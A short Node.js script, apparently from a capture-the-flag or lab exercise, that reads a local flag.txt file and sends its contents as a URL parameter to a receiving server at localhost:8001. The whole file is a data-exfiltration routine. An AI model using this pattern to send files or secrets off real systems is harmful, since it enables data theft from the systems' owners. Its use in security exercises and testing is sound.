const fs = require('fs');
const http = require('http'); // Use 'http' module for GET requests

// Path to the flag file
const flagFilePath = 'flag.txt';

// URL of the remote server to send the flag content
const remoteServerUrl = 'http://localhost:8001/receive-flag';

// Function to read the flag file and send it as a GET parameter
function sendFlag() {
    fs.readFile(flagFilePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Error reading flag file:', err);
            return;
        }

        // URL encode the flag content
        const encodedFlag = encodeURIComponent(data);
        
        // Make a GET request with the flag as a parameter
        http.get(`${remoteServerUrl}?flag=${encodedFlag}`, (resp) => {
            let responseData = '';

            // A chunk of data has been received.
            resp.on('data', (chunk) => {
                responseData += chunk;
            });

            // The whole response has been received.
            resp.on('end', () => {
                console.log('Response from server:', responseData);
            });

        }).on('error', (e) => {
            console.error('Error sending flag:', e);
        });
    });
}

// Execute the function
sendFlag();
